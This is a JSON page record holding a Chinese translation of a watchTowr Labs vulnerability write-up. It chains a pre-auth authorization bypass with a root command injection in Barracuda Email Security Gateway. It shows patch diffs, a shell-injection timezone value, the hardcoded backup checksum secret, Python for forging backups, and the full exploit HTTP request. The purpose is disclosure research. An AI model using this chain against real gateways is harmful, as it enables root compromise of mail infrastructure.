[{"_1":2,"_3":4},"root",{"_5":139},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":46,"_47":48,"_49":50,"_51":52,"_53":54,"_55":37,"_56":37,"_57":58,"_59":37,"_60":61},"expiresAt",1794195836000,"id","xcrtnnrnl1mz0bdw0wcmtusml","title","Barracuda Email Security Gateway 预认证远程 root RCE 利用链分析","originalTitle","Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)","summary","watchTowr Labs 分析 Barracuda Email Security Gateway 的 CVE-2026-116606 预认证授权绕过与 CVE-2026-111560 OS 命令注入如何串联形成预认证远程 root RCE。","reason","文章通过补丁差异和端到端请求还原两个漏洞的组合利用链，并公开备份校验与检测工具生成方法。","source",{"_72":138},"links",{"_129":137},"publishedAt","2026-11-05T21:19:58.000Z","discoveredAt","2026-11-06T05:09:32.629Z","timelineAt","category","disclosure","tags",[133,134,135,136],"score",78,"selected",true,"channel","news","story",{"_77":78,"_13":79},"x","readingMode","full","author","Sina Kheirkhah (@SinSinology)","body",{"_61":128,"_129":-5,"_130":131,"_132":37},"outline",[80,81,82,83,84,85,86,87,88,89,90,91,92,93,94],"relatedStories",[76],"topics",[68,69],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation","bodyLanguage","zh","factId","f65qmUlD3doQ","reportCount",2,"additionalSourceCount",1,{"_70":74,"_72":75},{"_70":71,"_72":73},"slug","research","name","技术研究","vuln","漏洞披露",{"_77":78,"_13":79},"publicId","9dc3f3bc-b9b2-4928-b494-d7fa86c243f1","Barracuda漏洞串联可预认证获取root权限",{"_11":126,"_96":127,"_98":99},{"_11":124,"_96":125,"_98":99},{"_11":122,"_96":123,"_98":99},{"_11":120,"_96":121,"_98":99},{"_11":118,"_96":119,"_98":99},{"_11":116,"_96":117,"_98":99},{"_11":114,"_96":115,"_98":99},{"_11":112,"_96":113,"_98":99},{"_11":110,"_96":111,"_98":99},{"_11":108,"_96":109,"_98":99},{"_11":106,"_96":107,"_98":99},{"_11":104,"_96":105,"_98":99},{"_11":102,"_96":103,"_98":99},{"_11":100,"_96":101,"_98":99},{"_11":95,"_96":97,"_98":99},"sec-15","text","检测工件生成器","level",3,"sec-14","将一切组合起来","sec-13","关于那个校验和","sec-12","打包备份","sec-11","让我们的备份通过验证","sec-10","从备份恢复到命令执行","sec-9","让我们利用它","sec-8","对 fix_tz.pl 进行差异比较","sec-7","对 Backup2.pm 进行差异比较","sec-6","幸运的是，我们正好有一个可与之配对的命令注入漏洞！（CVE-2026-111560）","sec-5","很快，我们有了一个嫌疑人：Index.pm","sec-4","“预身份验证授权绕过”是什么样的？有多少条腿？盐水？（CVE-2026-116606）","sec-3","场景设定","sec-2","好吧，但 CVE-2026-116606 和 CVE-2026-111560 是什么？","sec-1","Barracuda 是什么，我们为什么非谈不可？","<p><img src=\"/dailyinfo/media/8dedc9b308120e86.webp\" loading=\"lazy\" decoding=\"async\" alt=\"Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)\"></p><p>没错，就是这样！今天我们在水族馆。</p><p><strong>欢迎再次来到 watchTowr Labs 的另一篇博客文章。你现在就可以开始准备评论了。</strong></p><figure>\n            <p>\n                <video src=\"https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/media/2026/11/barracuda.mp4\" poster=\"/dailyinfo/media/0fa686d435aff664.jpg\" width=\"3840\" height=\"2160\" playsinline=\"\" preload=\"none\" controls=\"\"></video>\n                \n                \n            </p>\n            \n        </figure><h3 id=\"sec-1\">Barracuda 是什么，我们为什么非谈不可？</h3><p>Barracuda 的电子邮件安全网关解决方案（ESG）<a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;ref=labs.watchtowr.com\">可谓备受青睐</a>，原因有几个：</p><ul><li>对许多人来说，它就是部署在组织邮件系统前端的设备，用来决定哪些邮件是垃圾邮件、哪些邮件携带恶意软件，以及哪些邮件可以放行。</li><li>对另一些人来说，它还是在 UNC4841（据 Mandiant）利用 CVE-2023-2868 作为零日漏洞后，<a href=\"https://trust.barracuda.com/security/esg-vulnerability?ref=labs.watchtowr.com\">需要进行物理更换</a>的设备。</li></ul><p>无论你是谁，有一点在你的使用体验中始终不变：它又是一台位于边缘、检查所有内容，并以恰到好处且唯一的权限运行以拦截有关你博客文章的恶意邮件的设备。</p><h3 id=\"sec-2\">好吧，但 CVE-2026-116606 和 CVE-2026-111560 是什么？</h3><p>一如既往，CVE 编号总有一种出人意料的吸引力——这两个也不例外，正如 Barracuda 自己的<a href=\"https://trust.barracuda.com/security/pre-authentication-authorization-bypass-command-injection?ref=labs.watchtowr.com\">公告</a>所示，摘要如下：</p><table>\n<thead>\n<tr>\n<th>CVE</th>\n<th>漏洞</th>\n<th>CVSS</th>\n<th>受影响产品</th>\n<th>修复版本</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CVE-2026-116606</td>\n<td>预身份验证授权绕过（编辑：lol？）</td>\n<td>9.3 严重</td>\n<td>Barracuda ESG</td>\n<td>9.4.0.029</td>\n</tr>\n<tr>\n<td>CVE-2026-111560</td>\n<td>操作系统命令注入</td>\n<td>8.6 高危</td>\n<td>ESG、Load Balancer ADC、Message Archiver、WAF Control Center、Web Application Firewall、Web Security Gateway</td>\n<td>9.4.0.029</td>\n</tr>\n</tbody>\n</table><p>单独来看，你完全可以以相当英式的方式形容其中任何一个为“不理想”。但情况如果串联起来会更糟——如果你很英式，就会把它们形容为“还行”。真是尖锐。</p><p>那么，毫不意外，这些漏洞正是今天这篇 watchTowr Labs 博客文章的主题——所以，我们去喝杯咖啡，然后散散步吧。</p><h3 id=\"sec-3\">场景设定</h3><p>为支持今天的分析，我们搭建了设备，并使用我们惯常的“到底改了什么”流程比较了两个版本：</p><ul><li>存在漏洞的版本：Barracuda ESG 9.4.0.027</li><li>不同版本：Barracuda ESG 9.4.0.029</li></ul><p>作为背景，在逐步介绍本文内容之前，需要指出的是，Barracuda 发布了多个补丁文件，用于修复 CVE-2026-111560 和 CVE-2026-116606。不过，我们只审查了其中两个，具体称为：</p><ul><li>Patch-1（用于修复 CVE-2026-116606“预身份验证授权绕过”）</li><li>Patch-2（用于修复 CVE-2026-111560 操作系统命令注入）</li></ul><figure><img src=\"/dailyinfo/media/41febdebb120ad5b.webp\" srcset=\"/dailyinfo/media/979042e523480e5a.webp 720w, /dailyinfo/media/2c6fd9c8f704bed3.webp 1200w, /dailyinfo/media/41febdebb120ad5b.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)\" width=\"782\" height=\"601\"></figure><p>没有什么比因漏洞而对机架式服务器进行实体“驱魔”更能让我们感到暖意了（是的，我们知道事情没这么简单）。</p><h3 id=\"sec-4\">“预身份验证授权绕过”是什么样的？有多少条腿？盐水？（CVE-2026-116606）</h3><p>这正是我们坐下来问自己的问题。幸运的是，我们没等多久。</p><p>审查 Patch-1 时，安装程序至少对其用途进行了说明：</p><pre><code class=\"language-perl\">..snip..\n# Pre-authentication authorization bypass permits\n# arbitrary Spam_Config restore\n# CVSS 9.8 Critical\n</code></pre><p>顺便提醒那些目光犀利的读者，你会看到这里该漏洞的 CVSS 分数为 9.8，而 Barracuda 公告中为 9.3。我们最好的猜测是，9.8 反映的是两个漏洞被合并评分（CVSS 专家会迅速意识到这属于不当行为），而非这里发生了任何可疑之事。</p><figure><img src=\"/dailyinfo/media/6e02e695db129f7b.webp\" loading=\"lazy\" decoding=\"async\" alt=\"Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)\" width=\"615\" height=\"496\"></figure><p>深入查看此补丁中发生变化的文件后，我们很快列出了一批嫌疑人：</p><ul><li>Index.pm</li><li>Backup2.pm</li><li>bayesian_upload.pm</li><li>UserRole.pm</li><li>Params.pm</li></ul><h3 id=\"sec-5\">很快，我们有了一个嫌疑人：Index.pm</h3><p>Index.pm 的变化有些耐人寻味，但幸运的是改动很少。</p><p>值得称赞的是，Barracuda 提供了这条描述得很含糊的提示，暗示了问题可能是什么：</p><pre><code class=\"language-jsx\">+    # Send the error and stop here. Returning a userrole\n+    # would let response() run module handlers.\n</code></pre><p>这条注释反映在整个补丁中：</p><pre><code class=\"language-diff\"> if ($password_change_status ==\n     $Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{val}) {\n-    $params-&gt;{json_authenticate} = {\n+    $self-&gt;audit(\"failed_password_change\", $params-&gt;{user});\n+    # Send the error and stop here. Returning a userrole\n+    # would let response() run module handlers.\n+    return $self-&gt;_bailout_with_json_login_response(\n+        $env, $params, {\n         success =&gt; 'true',\n         message =&gt; $Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{msg}\n                    . \": \" . $message,\n         status =&gt; $Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{val},\n-    };\n-    return $userrole;\n+    });\n }\n</code></pre><p>因此，<span>&nbsp;<code>Index.pm</code>&nbsp;</span>负责处理密码更改尝试，但问题始于补丁前代码：当密码更改尝试失败时（使用&nbsp;<code>ERROR_PASSWD_CHANGE</code>）。</p><p>下面是完整的易受攻击函数，其中保留了来自&nbsp;<code>Index.pm</code>的原始行号：</p><pre><code class=\"language-perl\">383:     if(defined($params-&gt;{new_password}) &amp;&amp; defined($params-&gt;{retype_password}) &amp;&amp; ! (-e \"/tmp/bypass_password\")){\n384:         my $password_change_status=0;\n385:         my $message = \"\";\n386:         ($password_change_status, $message,$user) = Login::change_admin_password($params);\n387:         if($password_change_status == 1 &amp;&amp; $user){\n388:            # Dont allow logoff unless the request is from an authenticated logged in user\n389:             my $url = \"/cgi-mod/index.cgi\" . uri_hash_to_querystring({\n390:                     locale =&gt; $MS_globals::params{locale},\n391:                     error =&gt; $status\n392:                 });\n393:             my %redir = (-location=&gt;$url);\n394:             $self-&gt;audit('password_change', $params-&gt;{user});\n395:             Login::logoff_user($status, 1, $params-&gt;{user});\n396:             return bailout();\n397:         }\n398:         else{\n399:             if ($password_change_status == $Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{val}) {\n400:                 $params-&gt;{json_authenticate} = {\n401:                     success =&gt; 'true',\n402:                     message =&gt; $Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{msg}.\": \". $message,\n403:                     status =&gt; $Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{val},\n404:                 };\n405:                 $self-&gt;audit(\"failed_password_change\", $params-&gt;{user});\n406:                 return $userrole;\n407:             }\n</code></pre><p>虽然补丁前代码会返回一个冗长的 JSON 块来指示密码更改尝试失败，但它实际上并不会停止执行。</p><p>让我们将其拆解分析：</p><ul><li>当密码更改成功时（第 387 行），它在第 396 行以 <code>return bailout();</code> 结束，而 <code>bailout()</code> 是“我们已经完成，在此停止请求”的信号。</li><li>当它以 <code>ERROR_PASSWD_CHANGE</code> 失败时（第 399 行），则改为在第 406 行以 <code>return $userrole;</code> 结束。</li></ul><p>下一个合乎逻辑的问题是“<code>$userrole</code> 是什么？”<code>$userrole</code> 只是当前会话的角色对象，对于我们的未认证请求而言，就是低权限登录界面角色。</p><p>这为什么重要？因为上述密码更改代码位于&nbsp;<code>_process_params</code>内部，而调用它的方法是&nbsp;<code>response</code>：</p><pre><code>584: sub response {\n585:     my ($self, $env, $params) = @_;\n586:\n587:     $self-&gt;set_self_url($env, $params);\n588:\n589:     # If we are not activated, this removes various changes the user may\n590:     # have tried to make from the params hash.\n591:     $self-&gt;_check_activation($env, $params);\n592:\n593:     $self-&gt;_process_params($env, $params);\n594:\n595:     $self-&gt;_update_variables($env, $params);\n596:\n597:     Barracuda::Hooks::run_hooks(\"after write config\");\n</code></pre><p><code>_process_params</code> 在第 593 行返回，并将我们的 <code>$userrole</code> 直接交回给 <code>response</code>——返回时没有指示任何错误，函数也会按原样继续执行。</p><p>要复现此行为，我们向 <code>/cgi-mod/index.cgi</code>（最终到达此代码路径的端点）发送 POST 请求，并在正文中包含两个参数：</p><ul><li><code>new_password</code></li><li><code>retype_password</code></li></ul><pre><code>POST /cgi-mod/index.cgi HTTP/1.1\nHost: barracuda.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 47\n\nuser=admin&amp;new_password=one&amp;retype_password=two\n</code></pre><p>设备返回 HTTP 200，JSON 正文声明密码更改失败：</p><pre><code>{\"message\":\"Error: Password Change: \",\"no_ajax_redirect\":\"true\",\"redirect\":\"/cgi-mod/password_change.cgi?auth_type=Local&amp;locale=en_US&amp;user=admin&amp;error=Error: Password Change: \",\"success\":\"true\"}\n</code></pre><p>“但是等等，”你可能会问，“被拒绝的身份验证操作肯定会让后续特权操作无法发生了吧？登录界面角色还有什么用途？”</p><p>别再叫我们 Shirley 了。</p><p>现在，我们只需要找一个值得与之搭配的东西，接下来就是第二个弱点。</p><h3 id=\"sec-6\">幸运的是，我们正好有一个可与之配对的命令注入漏洞！（CVE-2026-111560）</h3><p>虽然密码更改机制中存在 Barracuda 称为“预身份验证授权绕过”的异常行为，但我们仍需确定实际上能借此做什么。</p><p>分析我们所谓的“补丁 2”时，我们再次获得了完整的 Perl 源代码，让我们的工作轻松了一些。</p><p>此补丁中有两个文件显得格外值得关注：</p><ul><li>Backup2.pm</li><li>fix_tz.pl</li></ul><figure><img src=\"/dailyinfo/media/1d8666294b16fc78.webp\" srcset=\"/dailyinfo/media/baeb0aac017ea7b4.webp 720w, /dailyinfo/media/0b02d5ac7c94b1c2.webp 1200w, /dailyinfo/media/1d8666294b16fc78.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)\" width=\"2000\" height=\"456\"></figure><figure><img src=\"/dailyinfo/media/72eaa7c955d135ef.webp\" srcset=\"/dailyinfo/media/7e4a8a6d524ab0b2.webp 720w, /dailyinfo/media/9884861ad58e98ab.webp 1200w, /dailyinfo/media/72eaa7c955d135ef.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)\" width=\"2000\" height=\"744\"></figure><h3 id=\"sec-7\">对 Backup2.pm 进行差异比较</h3><p>简要分析后，Backup2.pm 中唯一看似有意义的更改是对这段补丁前代码块所作的修改：</p><pre><code class=\"language-perl\">if( -f \"/home/product/code/config/tz\" ) {\n    my $system_timezone = Barracuda::Config::get('system_timezone');\n    `sed -i 's#TZ=.*#TZ=$system_timezone#' /home/product/code/config/tz`;\n}\n</code></pre><p>当我们将视线转向补丁版本并查看其中的变化时，就能更清楚地了解这个问题。总体而言，Barracuda 将 shell 命令执行替换成了……一种更安全的方法：</p><pre><code class=\"language-diff\"> if( -f \"/home/product/code/config/tz\" ) {\n     my $system_timezone = Barracuda::Config::get('system_timezone');\n-    `sed -i 's#TZ=.*#TZ=$system_timezone#' /home/product/code/config/tz`;\n+    if ($system_timezone &amp;&amp; -f \"/usr/share/zoneinfo/$system_timezone\") {\n+        open my $in, '&lt;', '/home/product/code/config/tz' or die $!;\n+        my @lines = &lt;$in&gt;;\n+        close $in;\n+        open my $out, '&gt;', '/home/product/code/config/tz' or die $!;\n+        for my $line (@lines) {\n+            $line =~ s/^TZ=.*/TZ=$system_timezone/ if $line =~ /^TZ=/;\n+            print $out $line;\n+        }\n+        close $out;\n+    } else {\n+        warn \"Skipping tz restore: invalid system_timezone='$system_timezone'\\n\";\n+    }\n }\n</code></pre><p>总结一下，这主要带来了三点：</p><ul><li>第一，厂商现在认为 <code>system_timezone</code> 足够不可信，因此要求在使用前必须将其解析为位于 <code>/usr/share/zoneinfo/</code> 下的真实文件。</li><li>其次，旧代码跨越了 shell 边界。Perl 反引号表示命令替换，因此 Perl 会构造一个字符串并将其交给 shell。单引号包裹该值看起来能提供保护，但它们只是生成的命令中的字符，并非 Perl 层面的安全边界。</li></ul><p>形如以下内容的值会重写 shell 语法：</p><pre><code>Region#';&lt;attacker-command&gt;;#\n</code></pre><p>第一个引号会闭合预期的 <code>sed</code> 表达式，分号会启动一条新命令，而 <code>#</code> 会将其余内容注释掉。</p><ul><li>最后（也正是让我们警觉起来的部分），函数名称（<code>finalize_restore</code>）提供了一个相当明显的线索，说明我们或许可以利用这个漏洞。<code>finalize_restore</code>。</li></ul><h3 id=\"sec-8\">对 fix_tz.pl 进行差异比较</h3><p>补丁差异比较中突出显示的第二个文件是 fix_tz.pl，它讲述了一个与命令注入有关的类似问题，具体与时区设置相关。</p><pre><code class=\"language-perl\">my $system_timezone = Barracuda::Config::get('system_timezone');\nexit if !$system_timezone;\n\n`sed -i 's#ZONE=.*#ZONE=$system_timezone#' /etc/sysconfig/clock`;\n</code></pre><p>实际上，补丁正是在那里添加了一道关卡：</p><pre><code class=\"language-diff\"> my $system_timezone = Barracuda::Config::get('system_timezone');\n exit if !$system_timezone;\n\n+if (! -f \"/usr/share/zoneinfo/$system_timezone\") {\n+    warn \"Invalid timezone: $system_timezone\\n\";\n+    exit 1;\n+}\n</code></pre><p>并移除了依赖 shell 的更新操作，改用相同的 Perl 读取、重写、写入模式：</p><pre><code class=\"language-diff\">-`sed -i 's#ZONE=.*#ZONE=$system_timezone#' /etc/sysconfig/clock`;\n+if (-f '/etc/sysconfig/clock') {\n+    open my $in, '&lt;', '/etc/sysconfig/clock' or die $!;\n+    my @lines = &lt;$in&gt;;\n+    close $in;\n+    open my $out, '&gt;', '/etc/sysconfig/clock' or die $!;\n+    for my $line (@lines) {\n+        $line =~ s/^ZONE=.*/ZONE=$system_timezone/ if $line =~ /^ZONE=/;\n+        print $out $line;\n+    }\n+    close $out;\n+}\n</code></pre><p>简而言之，我们发现了两个落地点：一个在 <code>Backup2.pm</code> 中，另一个在 <code>fix_tz.pl</code> 中。</p><p>实际上，<code>Backup2::finalize_restore</code> 会写入产品时区文件，而 <code>fix_tz.pl</code> 会写入操作系统时钟文件——并且，同一个看似可由攻击者控制和操纵的输入会到达两者。</p><p>“权限受限的用户无法写入此文件”——确实如此，但我们讨论的是安全设备。情况不同——这也正是上述代码使用 <code>sudo</code> 执行 <code>fix_tz.pl</code> 文件的原因。</p><pre><code class=\"language-perl\">if( -f \"/home/product/code/firmware/current/bin/fix_tz.pl\" ) {\n    system('/usr/bin/sudo',\n           '/home/product/code/firmware/current/bin/fix_tz.pl');\n}\n</code></pre><p>这不只是一个普通的操作系统命令注入漏洞，而是一个以 <code>root</code> 权限执行的漏洞。</p><h3 id=\"sec-9\">让我们利用它</h3><p>为了触发此漏洞，我们寻找了能够自然触达这段易受攻击代码的位置。其中一个位置格外突出：一个名为 <code>bayesian_upload.pm</code> 的上传处理程序。</p><p>下面是名为 <code>bayesian_upload.pm</code> 的上传处理程序文件：</p><pre><code class=\"language-perl\">53: bc_sub bayesian_upload_handler =&gt;\n54:     perm { 1 },\n55:     web_params( [param('user'), param('bayesian'), param('pu_bayesian_upload')]),\n56:     does {\n57:         my $args = shift;\n58:         return if(!defined($args-&gt;{'bayesian'}) || $ENV{REMOTE_USER} eq 'guest');\n59:\n60:         my $lock;\n61:         my $error = '';\n62:         my $filename = $Barracuda::BackupConfig::StagingJob::BACKUP_FILE;\n63:\n64:         try {\n65:             $lock = Barracuda::Backup2::_grab_lock();\n66:\n67:             my $uploader = $args-&gt;{bayesian};\n68:             if ($uploader-&gt;to_file( { dest =&gt; $filename } )) {\n69:                 throw Barracuda::Exception;\n70:             }\n71:         }\n72:         catch Barracuda::Backup2::Lock_Error with {\n73:             $error = 'lid_2876';\n74:         }\n75:         catch Error with {\n76:             $error = 'lid_379';\n77:         }\n78:         finally {\n79:             $lock &amp;&amp; $lock-&gt;punlock();\n80:             if ($error) {\n81:                 push(@Barracuda::UI::status_message,\n82:                     {\n83:                         message =&gt; $error,\n84:                         type    =&gt; 'error'\n85:                     }\n86:                 );\n87:                 return;\n88:             }\n89:         };\n90:\n91:         my %params;\n92:         $params{full_reload} = 0;\n93:         my $ret = 0;\n94:         try {\n95:             $ret = Barracuda::Backup2::restore_all($filename, %params);\n96:         } catch Error with {\n</code></pre><p>如你所见，这个函数相当简单。它需要几个参数，如果参数符合预期，我们就能到达第 95 行，其中 restore all 函数会处理用户提供的备份文件。</p><h3 id=\"sec-10\">从备份恢复到命令执行</h3><p>当然，事情没这么简单，我们的第一个问题是：“好吧，那么备份文件实际上是什么样的？”</p><p>幸运的是，在这种情况下，备份是一个 tar 文件，其中包含一个列出各种详细信息的 <code>backup.xml</code> 文件。下面是我们构建的一个示例结构：</p><pre><code>&lt;backup&gt;\n  &lt;component name=\"Spam_Config\"&gt;\n    &lt;file id=\"mysql\" checksum=\"[generated integrity value]\" path=\"mysql-poc.gz\" /&gt;\n  &lt;/component&gt;\n  &lt;info filename=\"poc.bak\" firmware_version=\"9.4.0.020\"\n        model=\"V300\" platform=\"5\" product=\"emailswitch\" type=\"manual_backup\"&gt;\n    &lt;component_version name=\"Config\" number=\"1\" /&gt;\n    &lt;component_version name=\"Files\" number=\"1\" /&gt;\n    &lt;component_version name=\"Spam_Config\" number=\"1\" /&gt;\n    &lt;component_version name=\"mysql\" number=\"1\" /&gt;\n  &lt;/info&gt;\n&lt;/backup&gt;\n</code></pre><p>你可能从之前的补丁评论中认出了 <code>Spam_Config</code>。这是我们的线索，而且它作为 <code>backup.xml</code> 文件的一部分存在。</p><p>当设备恢复 <code>Spam_Config</code> 时，它会加载一个小型 MySQL 转储，并将定义的信息恢复到本地 MySQL 数据库中。</p><p>真是幸运，其中一行正是 <code>system_timezone</code>。你看出接下来要做什么了吗？</p><p>如果我们在 <code>system_timezone</code> 这一行的值末尾附加一条 shell 命令，然后恢复该值，会怎样：</p><pre><code>UTC#';touch /tmp/watchTowr;#\n</code></pre><p>但先别急着往下说——我们实际上还没有构建出有效的备份文件。</p><h3 id=\"sec-11\">让我们的备份通过验证</h3><p>如前所述，备份由一个名为 <code>restore_all</code> 的函数恢复。该函数会解包归档文件、读取各个部分的列表，并逐一恢复：</p><pre><code class=\"language-perl\">444: sub restore_all {\n445:     my $bundle_filename = shift;\n446:     my %args = @_;\n447:     if (not exists($args{full_reload})) {\n448:         $args{full_reload} = 1;\n449:     }\n450:     change_directory(\"/mail/tmp\");\n451:     my $pl = _grab_lock();\n452:     log_message(\"Starting restore opertation...\");\n453:     my $poke_progress = sub { };\n454:     if ($args{progress_cb}) {\n455:         if (ref($args{progress_cb}) ne 'CODE') {\n456:             croak('progress_cb must be a CODE reference.');\n457:         }\n458:         $args{progress_cb}-&gt;(0);\n459:     }\n460:     my $dir;\n461:     if (Barracuda::FrameworkConfig::framework_config('backup_compatibility_on')) {\n462:         require IPC::Run;\n463:         my ($out, $err);\n464:         eval {\n465:             IPC::Run::run([\"$Barracuda::Environment::path_firmware/bin/file\", '-b', $bundle_filename], \\undef, \\$out, \\$err);\n466:         };\n467:         chomp($out);\n468:         if ($out &amp;&amp; $out ne 'POSIX tar archive (GNU)') {\n469:             $dir = $TMP_DIR;\n470:         }\n471:     }\n472:     if ($dir) {\n473:         system('cp', '-f', $bundle_filename, $dir . '/Backup.bak');\n474:     } else {\n475:         log_message(\"Untaring bundle...\");\n476:         $dir = untar_bundle($bundle_filename);\n477:     }\n478:     log_message(\"Reading the components to restore...\");\n479:     my $data = read_staged_metadata($dir);\n480:     $poke_progress = _create_poke_progress($data, $args{progress_cb});\n481:     log_message(\"Restoring components...\");\n482:     restore_components($data, $dir, \\%args, $poke_progress);\n483:     # Reload &amp; reboot\n484:     $pl-&gt;punlock();\n485:     log_message(\"Finalizing restore...\");\n486:     finalize_restore(\\%args);\n487:     return 1;\n</code></pre><h3 id=\"sec-12\">打包备份</h3><p>那么看起来很简单。我们只需在 XML 文件中放入一些 SQL 查询，将其打包成 tar 文件，然后恢复它。</p><p>但不行，生活要惩罚我们。</p><h3 id=\"sec-13\">关于那个校验和</h3><p><code>backup.xml</code> 中列出的每个文件都有一个 <code>checksum</code>，恢复函数会认真校验该校验和……它会读取文件字节，计算自身的校验和，并在校验和不匹配时拒绝备份。因此，我们平时在这些字段中随便输入数字的方法在这里行不通。</p><p>但这里还有一件有趣的事。这个校验和的构建方式如下：</p><p>校验和就是 <code>md5(file_bytes + secret + \".\")</code>。</p><p>秘密？你说呢？那一定是动态生成的唯一值，会频繁变化，或者以某种方式与机器绑定，因而无法预测。</p><p>我们公开这个秘密。</p><pre><code class=\"language-perl\">CHECKSUM_SECRET = b\"Barracuda Networks is your new best friend\"\n</code></pre><p>但实际上，校验和就是 <code>md5(file_bytes + \"Barracuda Networks is your new best friend\" + \".\")</code>。</p><p>如你在下方所见，这让我们能够自行确定校验和：</p><pre><code>47:     mysql_dump = gzip.compress(sql, compresslevel=9, mtime=0)\n48:     checksum = hashlib.md5(mysql_dump + CHECKSUM_SECRET + b\".\").hexdigest()\n49:     timestamp = time.strftime(\"%Y%m%dT%H%M%S\", time.gmtime())\n50:     backup_xml = f\"\"\"&lt;?xml version='1.0' standalone='yes'?&gt;\n51: &lt;backup&gt;\n52:   &lt;component name=\"Spam_Config\"&gt;\n53:     &lt;file id=\"mysql\" checksum=\"{checksum}\" path=\"mysql-poc.gz\" /&gt;\n</code></pre><h3 id=\"sec-14\">将一切组合起来</h3><p>虽然“字数越多，博客文章越长”这句谚语很准确，但遗憾的是，组合今天这篇博客文章中讨论的两个漏洞的 HTTP 请求实际上相当简单：</p><pre><code>POST /cgi-mod/index.cgi HTTP/1.1\nHost: barracuda.com\nContent-Type: multipart/form-data; boundary=BOUNDARY\n\n--BOUNDARY\nContent-Disposition: form-data; name=\"user\"\n\nadmin\n--BOUNDARY\nContent-Disposition: form-data; name=\"new_password\"\n\none\n--BOUNDARY\nContent-Disposition: form-data; name=\"retype_password\"\n\ntwo\n--BOUNDARY\nContent-Disposition: form-data; name=\"UPDATE_activation_code\"\n\n1\n--BOUNDARY\nContent-Disposition: form-data; name=\"pu_bayesian_upload\"\n\n1\n--BOUNDARY\nContent-Disposition: form-data; name=\"bayesian\"; filename=\"poc.bak\"\nContent-Type: application/octet-stream\n\n&lt;TAR BACKUP&gt;\n--BOUNDARY--\n</code></pre><figure>\n            <p>\n                <video src=\"https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/media/2026/11/barracuda-1.mp4\" poster=\"/dailyinfo/media/3e87bcf1127c3dbd.jpg\" width=\"3840\" height=\"2160\" playsinline=\"\" preload=\"none\" controls=\"\"></video>\n                \n                \n            </p>\n            \n        </figure><h3 id=\"sec-15\">检测工件生成器</h3><p>与往常一样，我们公开 Detection Artefact Generator，帮助你判断自身环境的易受攻击情况，并为修复方案提供依据。</p><p>你可以在我们的 GitHub <a href=\"https://github.com/watchtowrlabs/watchTowr-vs-Barracuda-RCE-CVE-2026-116606-CVE-2026-111560?ref=labs.watchtowr.com\">这里</a>找到它。</p>","original","zhKind","translation","complete","复现","漏洞利用","利用链","漏洞分析","https://labs.watchtowr.com/barracuda-networks-is-your-new-best-friend-barracuda-email-security-gateway-pre-auth-remote-root-rce-cve-2026-116606-cve-2026-111560/","watchTowr Labs",{"_140":141,"_142":-5},"changelogVersion","2026-10-01T08:00","release"]
